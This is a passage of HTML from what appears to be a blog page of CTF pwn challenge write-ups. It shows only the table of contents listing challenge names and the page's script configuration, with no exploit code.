class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">1.13.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">1.14.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-s-3"><span class="toc-number">1.15.</span> <span class="toc-text">ciscn_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">1.16.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">1.17.</span> <span class="toc-text">babyheap_0ctf_2017</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.17.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.17.2.</span> <span class="toc-text">学到的东西</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.18.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">1.19.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.20.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-EasyHeap"><span class="toc-number">1.21.</span> <span class="toc-text">[ZJCTF 2019]EasyHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%A7%A3-1"><span class="toc-number">1.21.1.</span> <span class="toc-text">二解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN"><span class="toc-number">1.22.</span> <span class="toc-text">[Black Watch 入群题]PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">1.23.</span> <span class="toc-text">cmcc_simplerop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">1.24.</span> <span class="toc-text">ciscn_2019_n_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui-33c3-2016"><span class="toc-number">1.25.</span> <span class="toc-text">babyfengshui_33c3_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcon-ctf-2019-one-punch"><span class="toc-number">1.26.</span> <span class="toc-text">hitcon_ctf_2019_one_punch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E8%BF%99%E9%A2%98%E6%9C%89%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">1.26.1.</span> <span class="toc-text">首先这题有几个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A4%E5%AE%9A%E5%AF%BB%E6%89%BE%E8%BF%87%E7%A8%8B"><span class="toc-number">1.26.2.</span> <span class="toc-text">magic函数的判定寻找过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89tcache%E7%BB%93%E6%9E%84%E5%A0%86%E5%9D%97%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.26.3.</span> <span class="toc-text">还有tcache结构堆块的结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasequoia-2020-summoner"><span class="toc-number">1.27.</span> <span class="toc-text">metasequoia_2020_summoner</span></a></li></ol></li></ol>
        </div>
      </div>
    </cosy-drag-box>
    
  </div>

</div>

<script>
  window.page = {
    use: 'valine'
  }
  window.katex = {
    enable: "",
    jsCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.js",
    cssCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css"
  }
  window.mermaid = {
    enable: "",
    theme: "",
    cdn: "//cdn.jsdelivr.net/npm/mermaid@10.4.0/dist/mermaid.min.js",
  }
  window.valine = {
    enable: "",
    appId: '4Q4EAMdq8elmFDwiIj0R0Z80-gzGzoHsz',
    appKey: 'JRv5ulQZAwmbGgfeetCXRvoW',
    avatar: 'monsterid',
    cdn: '//unpkg.com/valine@latest/dist/Valine.min.js',
    serverURLs: ''
  };
</script>


<script src="/js/0af3d6bb.js"></script>

  </main>
</body>

<script>
  window.theme = {
    color: 'hsl(238,50%,56%)'
  }
</script>


<script src="/js/69a216b6.js"></script>


</html>